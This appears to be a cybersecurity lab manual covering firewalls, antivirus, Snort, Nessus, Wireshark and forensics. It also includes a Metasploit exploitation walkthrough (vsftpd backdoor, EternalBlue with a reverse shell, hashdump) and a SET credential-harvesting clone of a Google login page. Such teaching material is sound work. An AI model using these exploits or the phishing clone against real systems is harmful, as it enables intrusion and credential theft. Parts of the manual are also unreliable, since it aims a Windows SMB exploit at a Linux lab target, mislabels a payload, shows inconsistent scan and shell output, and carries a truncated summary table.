

## Experiment 1: Setting Up and Configuring a Firewall

### Aim
To understand and demonstrate the setup, configuration, and management of a firewall to control and monitor incoming and outgoing network traffic based on predetermined security rules.

### Objectives
1. Install firewall software on a system
2. Configure firewall rules (allow/deny specific ports or IPs)
3. Apply and save configurations
4. Test firewall rules using network tools
5. Monitor firewall logs and traffic

### Tools Required
- A computer system (Windows/Linux)
- Virtual machines (Kali Linux, Ubuntu Server)
- Firewall software (UFW, iptables, pfSense, or Windows Defender Firewall)
- Wireshark (for traffic capture and analysis)
- nmap or netcat (for port scanning and testing)

### Step-by-Step Procedure with Commands

#### 1. Update System Packages
```bash
sudo apt update && sudo apt upgrade
```
**Purpose:** Ensures the system and firewall software are up-to-date with latest security patches

#### 2. Enable UFW (Uncomplicated Firewall)
```bash
sudo ufw enable
```
**Purpose:** Activates the firewall so rules begin taking effect on the system

#### 3. Check Firewall Status
```bash
sudo ufw status verbose
```
**Purpose:** Verifies if the firewall is active and displays current configuration

#### 4. Allow Essential Services (SSH and HTTP)
```bash
sudo ufw allow ssh
sudo ufw allow 80/tcp
```
**Purpose:** Allows safe and required traffic like SSH for remote login and HTTP for web access

#### 5. Block Unnecessary Ports
```bash
sudo ufw deny 23/tcp
```
**Purpose:** Blocks insecure or unused services (like Telnet) to minimize attack surface

#### 6. Set Default Policy
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
```
**Purpose:** Sets baseline policy to deny all incoming traffic unless explicitly allowed

#### 7. Add IP-Based Rules (Restrict SSH from Specific IP)
```bash
sudo ufw allow from 192.168.1.10 to any port 22 proto tcp
```
**Purpose:** Allows SSH access only from a trusted IP, improving access control

#### 8. Test Firewall Rules using nmap
```bash
nmap -p 22,80,443 <target-ip>
```
**Purpose:** Verifies which ports are open and accessible from external system

#### 9. Monitor Firewall Logs
```bash
sudo tail -f /var/log/ufw.log
```
**Purpose:** Views firewall activity in real-time

### Sample Output
- Firewall status showing active state
- nmap scan results showing allowed/blocked ports
- Real-time log entries showing traffic attempts

### Result
The firewall was successfully installed, configured, and tested using UFW. The system allowed essential traffic while effectively blocking unauthorized access, verified using nmap, Wireshark, and log monitoring.

### Pre-Viva Questions
1. What is the primary function of a firewall in a network?
2. Differentiate between hardware and software firewalls
3. What do "incoming" and "outgoing" traffic mean in firewall configuration?
4. Name two common firewall tools used in Linux environments
5. Why is it important to block unused ports in a firewall?

### Post-Viva Questions
1. Which ports did you allow and deny in UFW configuration, and why?
2. How did you test the firewall rules using nmap? What did results show?
3. What did Wireshark capture reveal about network traffic?
4. How are UFW logs helpful in understanding firewall activity?
5. If a legitimate service stops working after firewall setup, how would you troubleshoot?

---

## Experiment 2: Implementing and Testing Antivirus Software

### Aim
To implement, configure, and test antivirus software for detecting, isolating, and removing malware or suspicious files from a system.

### Objectives
1. Understand the role of antivirus software in system security
2. Install and configure antivirus software on a system
3. Perform full system and custom scans
4. Test detection of malware using test files (EICAR)
5. Analyze scan reports and take remediation action

### Tools Required
- A system with Windows/Linux OS
- Antivirus software (ClamAV, Windows Defender, Avast, Bitdefender, Kaspersky)
- EICAR test file (standard safe file for malware detection testing)
- Internet access (for updates)
- Terminal or command line interface (for Linux tools)

### Step-by-Step Procedure (Using ClamAV on Linux)

#### 1. Update System Packages
```bash
sudo apt update && sudo apt upgrade
```
**Purpose:** Ensures all packages are up-to-date before installation

#### 2. Install ClamAV
```bash
sudo apt install clamav clamav-daemon
```
**Purpose:** Installs the open-source ClamAV antivirus tool and its daemon for background scanning

#### 3. Update Virus Definitions
```bash
sudo freshclam
```
**Purpose:** Downloads the latest virus signature database for accurate detection

#### 4. Run a Full System Scan
```bash
sudo clamscan -r / --bell --i
```
**Purpose:** Performs recursive scan of entire system and reports only infected files

#### 5. Download EICAR Test File
```bash
curl -O https://secure.eicar.org/eicar.com.txt
```
**Purpose:** EICAR is a harmless test file used to simulate malware

#### 6. Scan the EICAR File
```bash
clamscan eicar.com.txt
```
**Purpose:** Confirms antivirus is functioning and capable of detecting threats

#### 7. Check Scan Logs
```bash
cat /var/log/clamav/clamav.log
```
**Purpose:** View detailed scan activity and infection logs

#### 8. Remove Infected Files
```bash
clamscan --remove eicar.com.txt
```
**Purpose:** Deletes identified infected files

### Windows Defender Procedure

#### 1. Open Windows Security
- Press Windows Key + type "Windows Security" and open it
- This is the interface for managing antivirus and firewall settings

#### 2. Check Real-Time Protection
- Navigate to: Virus & threat protection → Manage settings
- Ensure Real-time protection is turned ON
- Real-time protection scans all files when accessed or downloaded

#### 3. Update Virus Definitions
- In Virus & threat protection, click "Check for updates" under Protection updates
- Keeps Windows Defender updated with latest threat signatures

#### 4. Perform Quick or Full Scan
- In Virus & threat protection, click "Quick Scan"
- Or go to Scan options to choose "Full Scan"
- Scans either critical areas or entire system

#### 5. Download EICAR Test File
- Visit: https://www.eicar.org/?page_id=3950
- Download the standard test file: eicar.com.txt
- Windows Defender will immediately detect and quarantine

#### 6. View Threat History
- Go to Virus & threat protection → Protection history
- Displays list of detected threats and actions taken

#### 7. Restore or Remove File
- From Protection history, choose to allow, remove, or quarantine file

### Sample Output
- ClamAV scan results showing detected and removed files
- Windows Defender Protection history showing quarantined threats
- Log entries with timestamp and threat details

### Result
Antivirus software was successfully installed, configured, and tested using EICAR test file, confirming its ability to detect and respond to threats effectively.

### Pre-Viva Questions
1. What is a virus signature or definition in antivirus software?
2. What is the function of an antivirus quarantine area?
3. Why is it important to regularly update antivirus databases?
4. What is the purpose of the EICAR test file?
5. Name two popular antivirus software used in Windows and Linux

### Post-Viva Questions
1. How did the antivirus react when scanning the EICAR test file?
2. What command did you use to perform a full system scan?
3. How can you remove a detected threat using ClamAV?
4. Where are ClamAV scan results and logs stored?
5. What would you do if a critical system file is falsely flagged as a virus?

---

## Experiment 3: Simulating a Phishing Attack and Detection

### Aim
To simulate a phishing attack in a controlled environment and implement detection techniques to identify and mitigate phishing attempts.

### Objectives
1. Understand the concept of phishing and its impact on users
2. Simulate a phishing email or webpage to study attacker methodology
3. Analyze phishing indicators (suspicious URLs, sender spoofing, abnormal requests)
4. Use tools and techniques for detecting phishing attempts
5. Create awareness about prevention strategies against phishing

### Tools Required
- Kali Linux (for creating phishing pages with Social Engineering Toolkit - SET)
- Browser (to test phishing webpage)
- Email Client (to simulate phishing email delivery)
- Wireshark (optional - for monitoring traffic)
- URL scanning tools (VirusTotal, PhishTank)

### Step-by-Step Procedure

#### 1. Setup Environment
```bash
Launch Kali Linux in VirtualBox/VMware
```
**Purpose:** Ensures a safe, isolated environment for testing

#### 2. Start SET Tool
```bash
sudo setoolkit
```
**Purpose:** Loads the Social Engineering Toolkit used for phishing simulations

#### 3. Select Attack Type
Follow the prompts:
- Select: 1) Social Engineering Attacks
- Select: 2) Website Attack Vectors
- Select: 3) Credential Harvester

**Purpose:** Prepares a fake login page to capture credentials

#### 4. Clone Target Website
```
Enter a URL of a legitimate site (e.g., https://accounts.google.com)
```
**Purpose:** The tool creates a phishing replica of the page

#### 5. Host Phishing Page
- The cloned page is hosted locally (e.g., http://192.168.1.100)
- SET will display the hosting IP and port

#### 6. Simulate Victim Access
- Open the phishing URL in a browser
- Enter dummy credentials (username and password)
- SET captures and displays entered credentials in terminal

#### 7. Detection Phase - Using Wireshark
```bash
sudo wireshark
```
- Set filter: `tcp.port == 80` (to see HTTP traffic)
- Observe unusual traffic redirections
- Look for non-HTTPS connections

#### 8. Detection Phase - Using VirusTotal
- Visit: https://www.virustotal.com/
- Paste the phishing URL in the search box
- Check if the URL is flagged as malicious by multiple security vendors

#### 9. Detection Phase - Using PhishTank
- Visit: https://www.phishtank.com/
- Submit the phishing URL for analysis
- Check historical phishing reports

#### 10. Prevention Measures Demonstration
- Check SSL certificates by clicking the padlock icon
- Hover over links to reveal suspicious domains
- Show browser phishing filter warnings
- Demonstrate email security features

### Sample Output
1. Screenshot of SET terminal capturing credentials
2. Screenshot of phishing page opened in browser
3. Screenshot of VirusTotal flagging the phishing URL
4. Wireshark capture showing HTTP traffic to phishing server
5. PhishTank report showing URL classification

### Result
Phishing attack was successfully simulated and credentials were captured using cloned webpage. The phishing attempt was detected through URL scanning tools and traffic analysis.

### Pre-Viva Questions
1. What is Phishing and why is it dangerous?
2. What are common signs of a phishing email or webpage?
3. Name any two tools used for simulating phishing attacks
4. How does HTTPS help in preventing phishing?
5. What is the role of user awareness in phishing prevention?

### Post-Viva Questions
1. How were credentials captured during the phishing simulation?
2. What differences did you notice between phishing page and original?
3. How can phishing URLs be detected automatically?
4. Why is phishing considered a social engineering attack?
5. Suggest two real-world mitigation strategies against phishing

---

## Experiment 4: Performing Vulnerability Scanning Using Nessus

### Aim
To perform a vulnerability scan on a system using Nessus and analyze the results to identify security weaknesses.

### Objectives
1. Understand the role of vulnerability scanning in cybersecurity
2. Install and configure Nessus vulnerability scanner
3. Perform scans on target system within controlled network
4. Identify vulnerabilities based on CVE and severity ratings
5. Generate and interpret Nessus scan reports

### Tools Required
- Nessus Essentials (Free version from Tenable)
- Target System (Windows/Linux VM or local host)
- Web browser for accessing Nessus dashboard
- Internet access (for plugin updates)
- Optional: Metasploitable VM (vulnerable test machine)

### Step-by-Step Procedure

#### 1. Download and Install Nessus
- Visit: https://www.tenable.com/products/nessus
- Select Nessus Essentials
- Register with valid email for activation code
- Download the installer for your OS (Linux/Windows)

**Installation (Linux):**
```bash
dpkg -i Nessus-10.x.x-debian6_amd64.deb
```

**Purpose:** Nessus Essentials is free and suitable for academic/lab use

#### 2. Start Nessus Service and Open Dashboard
```bash
sudo systemctl start nessusd
```
**Purpose:** Starts the Nessus daemon

Access Nessus in browser:
```
https://localhost:8834
```
**Purpose:** Nessus runs as local web application on port 8834

#### 3. Enter Activation Code and Update Plugins
- First login prompts for activation code
- Enter the code from email registration
- Allow plugin updates (this may take 10-15 minutes)

**Purpose:** Ensures scanner has latest vulnerability definitions

#### 4. Create and Configure a New Scan
- Click "New Scan"
- Choose template: "Basic Network Scan"
- Enter Name and Description

#### 5. Add Target System
- Enter target IP address or range (e.g., 192.168.1.10)
- Example: `192.168.1.100` for single IP
- Or: `192.168.1.0/24` for network range

**Purpose:** Specifies what system to analyze

#### 6. Configure Scan Settings
- Set scan policy: "Basic Network Scan"
- Schedule: Run Now or Set Time
- Set discovery credentials (optional, for authenticated scans)

**Purpose:** Customizes scan parameters and timing

#### 7. Launch the Scan
- Click "Launch" button
- Monitor progress in real-time dashboard

**Purpose:** Starts the vulnerability assessment

#### 8. View Scan Results
Results are categorized by severity:
- **Critical** - Highest risk, immediate action needed
- **High** - Significant vulnerabilities
- **Medium** - Moderate risk
- **Low** - Minor issues
- **Info** - Informational findings

#### 9. Analyze Individual Vulnerabilities
- Click on each vulnerability to view:
  - CVE ID (Common Vulnerabilities and Exposures)
  - CVSS Score (severity rating)
  - Description
  - Recommended remediation

#### 10. Generate and Export Report
```
Click Report → Export → PDF/HTML/CSV
```

**Purpose:** Generates detailed document of vulnerabilities and solutions

### Sample Output
- Dashboard showing scan progress
- Vulnerability chart with severity distribution
- List of detected vulnerabilities with CVE IDs
- Detailed remediation recommendations
- PDF export of full report

### Result
Nessus was successfully used to scan target system, detect multiple vulnerabilities based on CVEs, and generate comprehensive report categorizing threats by severity for mitigation planning.

### Pre-Viva Questions
1. What is vulnerability scanning and how is it different from penetration testing?
2. What are the main components of Nessus architecture?
3. Why are CVEs important in vulnerability reports?
4. Name a few types of scans supported by Nessus
5. What kind of systems should you avoid scanning without permission?

### Post-Viva Questions
1. Which scan template did you use and why?
2. How does Nessus identify vulnerabilities on a target system?
3. What was the most severe vulnerability found in your scan?
4. How can you reduce false positives in Nessus results?
5. What action would you take after receiving a high-severity vulnerability report?

---

## Experiment 5: Implementing and Configuring an Intrusion Detection System (IDS)

### Aim
To implement and configure an Intrusion Detection System (IDS) on a network to monitor, detect, and alert for suspicious activities and possible attacks.

### Objectives
1. Understand working of signature-based and anomaly-based IDS
2. Install and configure IDS such as Snort or Suricata
3. Monitor live network traffic for intrusion attempts
4. Create and test basic custom intrusion detection rules
5. Analyze IDS alerts and logs for suspicious patterns

### Tools Required
- Snort (or Suricata) IDS
- Kali Linux / Ubuntu
- Wireshark (for optional packet analysis)
- Attack simulation tools (nmap, hping3)
- Text editor (nano, vim)
- Internet connection

### Step-by-Step Procedure with Commands

#### 1. Update and Install Snort
```bash
sudo apt update
sudo apt install snort
```
**Purpose:** Installs Snort, a widely-used open-source IDS tool

#### 2. Identify and Configure Network Interface
```bash
ip a
```
**Purpose:** Shows available network interfaces (e.g., eth0, wlan0)

Set interface in promiscuous mode:
```bash
sudo ifconfig eth0 promisc
```
**Purpose:** Allows IDS to inspect all packets on the network

#### 3. Test Snort Configuration
```bash
snort -T -c /etc/snort/snort.conf
```
**Purpose:** Tests configuration file for errors before starting

#### 4. Check Default Rules Directory
```bash
ls -la /etc/snort/rules/
```
**Purpose:** Lists available rule files

#### 5. Add Custom Rule
Edit the local rules file:
```bash
sudo nano /etc/snort/rules/local.rules
```

Add a custom rule to detect ICMP (ping) traffic:
```
alert icmp any any -> any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)
```

**Explanation:**
- `alert` - Type of action (alert, pass, drop, etc.)
- `icmp` - Protocol to detect
- `any any` - Any source IP and port
- `->` - Direction of traffic
- `any any` - Any destination IP and port
- `msg` - Alert message
- `sid` - Unique signature ID
- `rev` - Revision number

#### 6. Another Custom Rule Example - Detecting Port Scanning
```
alert tcp any any -> any any (flags: S; msg:"Port Scan Detected"; flow: stateless; sid:1000002; rev:1;)
```

**Purpose:** Detects TCP SYN packets (port scanning attempts)

#### 7. Start Snort in IDS Mode (Real-time monitoring)
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

**Parameters:**
- `-A console` - Output alerts to console
- `-q` - Quiet mode (minimal output)
- `-c` - Configuration file
- `-i eth0` - Network interface to monitor

**Purpose:** Starts Snort to display alerts in real-time

#### 8. Simulate Network Traffic/Attacks in Another Terminal
Open a new terminal and run:

Ping detection test:
```bash
ping <target-ip>
```

Port scanning test (from attack machine):
```bash
nmap <target-ip>
```

Detect HTTP traffic:
```bash
curl http://<target-ip>
```

**Purpose:** Generate suspicious traffic to trigger Snort alerts

#### 9. Observe Alerts
Snort will display output similar to:
```
[**] [1:1000001:1] ICMP Ping Detected [**]
[Priority: 3]
{ICMP} 192.168.1.5 -> 192.168.1.100

[**] [1:1000002:1] Port Scan Detected [**]
[Priority: 2]
{TCP} 192.168.1.5:12345 -> 192.168.1.100:80
```

**Purpose:** Shows that Snort is actively monitoring and alerting

#### 10. Check Snort Logs
```bash
cat /var/log/snort/alert
```

Or for binary format:
```bash
snort -r /var/log/snort/snort.log.xxxxxxxx
```

**Purpose:** Reviews historical alerts and activities

#### 11. Advanced: Create Rule for DNS Query Detection
```
alert dns any any -> any 53 (msg:"DNS Query Detected"; sid:1000003; rev:1;)
```

**Purpose:** Detects DNS traffic on port 53

### Sample Output
- Terminal showing Snort startup and configuration load
- Real-time alerts appearing during attack simulation
- Formatted alert messages with source/destination details
- Log file containing all detected events

### Result
An Intrusion Detection System was successfully implemented and configured using Snort. The IDS detected simulated attacks and generated appropriate alerts based on custom rules, demonstrating real-time traffic monitoring and threat detection capabilities.

### Pre-Viva Questions
1. What is the difference between IDS and IPS?
2. Name two types of IDS and explain their functions
3. What is promiscuous mode and why is it important in IDS?
4. What are signatures in the context of Snort?
5. What kind of traffic can trigger alerts in an IDS?

### Post-Viva Questions
1. How did you test the custom Snort rule?
2. What command starts Snort in live monitoring mode?
3. How does Snort differentiate between different attack types?
4. Where are Snort logs stored by default?
5. What could be the next step after detecting an intrusion?

---

## Experiment 6: Exploiting a Sample Vulnerability Using Metasploit

### Aim
To exploit a known vulnerability in a vulnerable system using Metasploit Framework and gain unauthorized access for ethical testing and understanding of exploitation techniques.

### Objectives
1. Understand how Metasploit Framework works for penetration testing
2. Set up test environment using vulnerable VM (Metasploitable2)
3. Find and select exploit module for known vulnerability
4. Configure payloads and execute exploit
5. Gain reverse shell or meterpreter session

### Tools Required
- Kali Linux (attacker machine)
- Metasploit Framework
- Metasploitable2 (target vulnerable VM)
- nmap (for service discovery)
- Internet connection (optional)

### Step-by-Step Procedure with Commands

#### 1. Start Virtual Machines
- Launch Kali Linux (attacker) and Metasploitable2 (victim)
- Ensure both are on same NAT or host-only network

**Purpose:** Enables network communication for exploitation

#### 2. Discover Target Services Using Nmap
```bash
nmap -sV <Target-IP>
```

**Parameters:**
- `-sV` - Service version detection

**Example:**
```bash
nmap -sV 192.168.1.105
```

**Purpose:** Scans the Metasploitable2 VM to find services and versions

**Expected Output:**
```
22/tcp   open   ssh      OpenSSH 4.7p1 Debian 8+etch3
25/tcp   open   smtp     Postfix smtpd
53/tcp   open   domain   ISC BIND 9.4.2
139/tcp  open   netbios-ssn Samba smbd 3.0.28a
445/tcp  open   netbios-ssn Samba smbd 3.0.28a
```

#### 3. Launch Metasploit Console
```bash
msfconsole
```

**Purpose:** Starts Metasploit Framework for exploitation

#### 4. Search for Vulnerability Modules
Example for vsftpd backdoor (on port 21):
```
search vsftpd
```

Or search by CVE:
```
search type:exploit platform:linux vsftpd
```

**Purpose:** Finds available exploit modules for vulnerable service

#### 5. Use the Exploit Module
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

**Purpose:** Loads the module for vsftpd 2.3.4 vulnerability

#### 6. View Module Options
```
show options
```

**Output will show:**
```
MODULE OPTIONS (current setting)
==========================================
Name              Current Setting  Required  Description
----              ----------------  --------  -----------
RHOSTS            [blank]           yes       The target address range or CIDR identifier
RPORT             21                yes       The target port (TCP)
LHOST             [blank]           no        The listen address (an interface may be specified)
LPORT             4444              no        The listen port
```

#### 7. Set Target IP (RHOSTS)
```
set RHOSTS 192.168.1.105
```

**Purpose:** Specifies target machine

#### 8. Set Payload (if required)
```
set PAYLOAD cmd/unix/interact
```

Or for Meterpreter shell:
```
set PAYLOAD cmd/unix/reverse_perl
```

**Purpose:** Defines what code executes after successful exploitation

#### 9. Check Payload Options
```
show payload
```

#### 10. Run the Exploit
```
exploit
```

Or with verbose output:
```
exploit -v
```

**Purpose:** Executes the attack and attempts to get a session

#### 11. Interact with the Session
If successful, you'll receive a shell prompt:
```
[*] Command shell session 1 opened (192.168.1.100:4444 -> 192.168.1.105:39641)
shell
```

You can now execute commands:
```
whoami
id
ls -la
pwd
```

#### 12. Another Example - Samba Exploitation
```
search samba
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

#### 13. Advanced Session Management
List sessions:
```
sessions -l
```

Interact with session:
```
sessions -i 1
```

Background session:
```
background
```

#### 14. Post-Exploitation Commands (if Meterpreter)
```
sysinfo
getuid
ps (list processes)
migrate <PID>
hashdump
```

#### 15. Exit Session Cleanly
```
exit
```

### Sample Output
```
[*] Connecting to target...
[+] TARGET 192.168.1.105:21 - Connected!
[+] TARGET 192.168.1.105:21 - Backdoor found!
[+] Backdoor working, dropping into shell...
[*] Command shell session 1 opened
ftp> whoami
root
ftp> pwd
/tmp
```

### Result
A known vulnerability in target system was successfully exploited using Metasploit Framework, resulting in unauthorized access (reverse shell), demonstrating real-world ethical hacking and exploitation techniques in controlled lab environment.

### Pre-Viva Questions
1. What is Metasploit and how is it used in penetration testing?
2. What is the difference between an exploit and a payload?
3. What is the purpose of nmap in ethical hacking?
4. What is Metasploitable2 VM used for?
5. Name different types of payloads in Metasploit

### Post-Viva Questions
1. Which vulnerability did you exploit and why?
2. How do you set the target IP in Metasploit?
3. What happened after you ran the exploit?
4. What is a reverse shell and how is it achieved?
5. What precautions should be taken when using Metasploit in real environments?

---

## Experiment 7: Analyzing Network Traffic with Wireshark

### Aim
To capture and analyze network packets using Wireshark, understand different protocols, and identify potential anomalies or security issues in the traffic.

### Objectives
1. Install and set up Wireshark for packet analysis
2. Capture live traffic from network interface
3. Identify and analyze various network protocols (HTTP, TCP, ICMP, DNS)
4. Inspect packet details (source/destination IP, port, flags, etc.)
5. Detect anomalies, suspicious packets, or signs of attack

### Tools Required
- Wireshark (latest version)
- Kali Linux / Windows / Ubuntu
- Internet connection / test LAN
- Optional tools: ping, curl, nmap (for traffic simulation)

### Step-by-Step Procedure with Commands

#### 1. Install Wireshark (if not already installed)

**On Linux:**
```bash
sudo apt install wireshark
```

**On Ubuntu:**
```bash
sudo snap install wireshark
```

#### 2. Launch Wireshark
```bash
wireshark
```

Or from GUI menu, search for Wireshark and open

**Purpose:** Opens GUI-based packet analyzer tool

#### 3. Select Network Interface
- In main window, click interface list
- Select your active interface (e.g., eth0, wlan0, enp0s3)
- Double-click to start capturing

**Purpose:** Specifies which network interface to monitor

#### 4. Start Capturing Packets
- Click the shark fin icon (blue)
- Or go to: Capture → Start

**Purpose:** Begins recording all packet data

#### 5. Generate Network Traffic to Capture
Open another terminal and run:

**Ping traffic:**
```bash
ping google.com
```

**HTTP traffic:**
```bash
curl http://example.com
```

**DNS traffic:**
```bash
nslookup google.com
```

**Port scanning:**
```bash
nmap -p 1-1000 192.168.1.100
```

**Purpose:** Generates different types of traffic for analysis

#### 6. Stop Capture
- Click the red square icon (stop)
- Or go to: Capture → Stop

**Purpose:** Ends the capture session

#### 7. Apply Filters to View Specific Traffic

**Show only HTTP traffic:**
```
http
```

**Show only ICMP traffic (ping):**
```
icmp
```

**Show only DNS traffic:**
```
dns
```

**Show specific TCP port (e.g., port 80):**
```
tcp.port == 80
```

**Show specific source IP:**
```
ip.src == 192.168.1.100
```

**Show specific destination IP:**
```
ip.dst == 192.168.1.1
```

**Show traffic between two IPs:**
```
ip.src == 192.168.1.100 && ip.dst == 8.8.8.8
```

**Show TCP packets with SYN flag:**
```
tcp.flags.syn == 1
```

**Show only HTTPS/TLS traffic:**
```
tls
```

**Purpose:** Filters help isolate specific types of traffic

#### 8. Inspect Individual Packets
- Click on a packet in the upper pane to select it
- Expand sections in middle pane to view:
  - Frame (packet number, timestamp)
  - Ethernet frame
  - IP headers (source, destination)
  - TCP/UDP headers
  - Payload data

**Purpose:** Packet-level inspection shows protocol details and anomalies

#### 9. Analyze Packet Details

For a TCP packet, look for:
- **TCP Flags:**
  - SYN - Connection initiation
  - ACK - Acknowledgment
  - FIN - Connection close
  - RST - Connection reset

For HTTP packet, view:
- **Request/Response Lines**
- **Headers** (Host, User-Agent, etc.)
- **Body** (HTML, JSON, etc.)

For DNS packet, view:
- **Queries** (domain requested)
- **Answers** (IP address returned)

#### 10. Follow TCP Stream
- Right-click on packet → Follow → TCP Stream
- Shows complete conversation between client and server

**Purpose:** Displays full bidirectional communication

#### 11. Export Data for Analysis
- Select packet → File → Export Selected Packet Bytes
- Or File → Export Packet Dissections → CSV

**Purpose:** Saves packet data for further analysis

#### 12. Save Capture File
```
File → Save As → filename.pcapng
```

Or keyboard shortcut:
```
Ctrl + Shift + S
```

**Purpose:** Useful for future analysis or submission

#### 13. Advanced Filtering Examples

**Detect suspicious port scanning:**
```
tcp.flags.syn == 1 && tcp.window_size == 1024
```

**Detect potential DoS:**
```
frame.len > 1500
```

**Detect unusual protocols:**
```
ip.proto != 6 && ip.proto != 17 && ip.proto != 1
```

**Detect incomplete connections:**
```
tcp.flags.fin == 0 && tcp.flags.syn == 1 && tcp.ack == 0
```

### Common Wireshark Statistics

#### View Protocol Distribution
- Go to: Statistics → Protocol Hierarchy
- Shows breakdown of all protocols captured

#### View Conversations
- Statistics → Conversations
- Shows communication pairs (IP, port, packet count, data)

#### View Endpoints
- Statistics → Endpoints
- Lists all IP addresses and their traffic volume

### Sample Output
- Wireshark main window with packet list
- Filtered packets showing only HTTP traffic
- Expanded packet details showing Ethernet, IP, TCP, HTTP layers
- TCP stream showing full request/response
- Statistics showing protocol breakdown

### Result
Wireshark was successfully used to capture and analyze network traffic, identify various protocols, inspect packet-level details, and filter out suspicious or interesting packets for network security analysis.

### Pre-Viva Questions
1. What is the purpose of Wireshark in cybersecurity?
2. What is a packet and what does it contain?
3. Define the difference between TCP and UDP
4. What is the function of filters in Wireshark?
5. How does ICMP differ from HTTP in packet behavior?

### Post-Viva Questions
1. Which filters did you apply and why?
2. What was the IP address of the DNS server observed?
3. Were there any retransmissions or errors in your capture?
4. Did you observe any unusual port activity?
5. How can Wireshark help in detecting a man-in-the-middle attack?

---

## Experiment 8: Investigating a Cyber Incident Using Forensics Tools

### Aim
To investigate a simulated cyber incident using forensic tools and analyze digital evidence from a compromised system.

### Objectives
1. Understand phases of digital forensics in cyber incident
2. Acquire and examine disk or memory images using forensic tools
3. Identify artifacts (deleted files, logs, suspicious executables)
4. Analyze browser history, USB access logs, malicious processes
5. Prepare basic forensics report based on findings

### Tools Required
- Autopsy (GUI-based digital forensics tool)
- FTK Imager / dd (for evidence acquisition)
- Volatility (for memory analysis)
- Kali Linux or Windows system
- Sample disk/memory image (.E01, .dd, .mem)
- Internet (for tool installation)

### Step-by-Step Procedure with Commands

#### 1. Install Autopsy (if not installed)

**On Ubuntu/Debian:**
```bash
sudo apt install autopsy
```

**On Kali Linux:**
```bash
sudo apt install autopsy sleuthkit
```

**Purpose:** Installs GUI-based forensics tool for analyzing disk images

#### 2. Launch Autopsy
```bash
autopsy
```

Or open from applications menu

**Purpose:** Opens the forensics investigation interface

#### 3. Create New Case
- Click "New Case"
- Enter Case Name (e.g., "CompromisedSystem_2024")
- Enter Case Number
- Enter Examiner Name
- Click "Make New Case"

**Purpose:** Initializes investigation project

#### 4. Add Data Source

Option 1 - Add Disk Image:
- Case → Add Data Source
- Select: "Disk Image or VM File"
- Browse and select: image.dd or image.E01

Option 2 - Add Local Drive:
- Select: "Local Drive"
- Choose drive letter or partition

**Purpose:** Loads suspect's storage for analysis

#### 5. Analyze File System
Once image is loaded:

**Navigate to directories:**
- C:\Users\(username)
- Desktop
- Documents
- Downloads
- AppData\Local

**Look for:**
- Recently modified files (check MAC times)
- Suspicious executables (.exe, .dll, .ps1)
- Configuration files
- Log files

**Purpose:** Shows potential tampering or malicious activity

#### 6. Check File Properties and Timeline

**View File Modification Times:**
- Right-click file → Properties
- Check: Modified, Accessed, Created times
- Look for suspicious recent modifications

**Create Timeline:**
- Tools → Timeline → Create Timeline
- Select date range
- View all events chronologically

**Purpose:** Reconstructs sequence of attacker activities

#### 7. Recover Deleted Files

In Autopsy:
- Click "Deleted Files" category
- View list of deleted/unallocated files
- Select file → Recover

**Purpose:** Deleted files often contain evidence of attack

#### 8. Analyze Web History and Downloads

**Browser History:**
- Navigation to: C:\Users\(username)\AppData\Local\Google\Chrome\User Data
- Look at: History, Cookies, Cache

**Firefox History:**
- C:\Users\(username)\AppData\Roaming\Mozilla\Firefox\Profiles

**Purpose:** Shows websites visited, potential malicious downloads

#### 9. Check USB Device History (Windows)

Navigate to Registry:
- HKLM\SYSTEM\ControlSet001\Enum\USBSTOR
- Or setupapi.dev.log file

**Command line (if Windows forensics):**
```
reg query HKLM\SYSTEM\ControlSet001\Enum\USBSTOR
```

**Purpose:** Reveals unauthorized device usage or data exfiltration

#### 10. Analyze Event Logs (Windows)

Navigate to:
```
C:\Windows\System32\winevt\Logs
```

Look for:
- Application.evtx
- Security.evtx
- System.evtx
- PowerShell_Operational.evtx

**Purpose:** Shows system events, failed logins, program execution

#### 11. Memory Analysis with Volatility

First, identify OS profile:
```bash
volatility imageinfo -f memory.img
```

**Output example:**
```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility is now accepting pull requests to become open source
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64
```

List running processes:
```bash
vol.py -f memory.img --profile=Win7SP1x64 pslist
```

Find hidden/injected code:
```bash
vol.py -f memory.img --profile=Win7SP1x64 malfind
```

Dump suspicious process:
```bash
vol.py -f memory.img --profile=Win7SP1x64 memdump -p <PID> -D output_folder
```

**Purpose:** Reveals active malware and hidden processes

#### 12. Search for Keywords

In Autopsy:
- Tools → Keyword Search
- Enter suspicious keywords:
  - Malware names
  - Command domains
  - Attacker IPs
  - Suspicious file patterns

**Purpose:** Quickly finds evidence of compromise

#### 13. Create Forensics Report

Autopsy:
- Reports → Generate Report
- Select: HTML Report
- Choose findings to include
- Click "Generate"

**Purpose:** Documents all findings for investigation

#### 14. Document Evidence Chain of Custody

Record:
- Date/Time of acquisition
- Source system details
- Examiner name
- Tools used
- Hash values (MD5, SHA-256)

**Generate hash:**
```bash
md5sum disk_image.dd
sha256sum disk_image.dd
```

**Purpose:** Maintains evidence integrity and admissibility

### Sample Output
- Autopsy interface showing loaded disk image
- File directory tree with suspicious files highlighted
- Timeline view showing chronological events
- List of recovered deleted files
- Browser history showing malicious sites
- Memory analysis showing hidden processes
- Forensics report in HTML format

### Result
Cyber incident was successfully investigated using forensic tools like Autopsy and Volatility, uncovering deleted files, suspicious activities, and digital evidence for reporting.

### Pre-Viva Questions
1. What are the phases of digital forensics?
2. What is a disk image and why is it important?
3. Name common file systems Autopsy can analyze
4. What types of evidence can you recover from memory analysis?
5. What are MAC times in digital forensics?

### Post-Viva Questions
1. What suspicious activity did you identify in the experiment?
2. Which deleted file(s) were recovered and what did they reveal?
3. How does timeline analysis help in incident investigation?
4. What evidence indicates data exfiltration?
5. How do forensic tools maintain evidence integrity?

---

# Summary of All Experiments

| Exp No | Name | Key Tools | Main Commands |
|--------|------|-----------|--------------|
| 1 | Firewall Setup | UFW, nmap, Wireshark | `sudo ufw enable`, `sudo ufw allow ssh`, `nmap -p 22,80,443 <IP>` |
| 2 | Antivirus Testing | ClamAV, EICAR | `sudo apt install clamav`, `clamscan -r /`, `freshclam` |
| 3 | Phishing Detection | SET, VirusTotal | `sudo setoolkit`, Social Engineering Attacks |
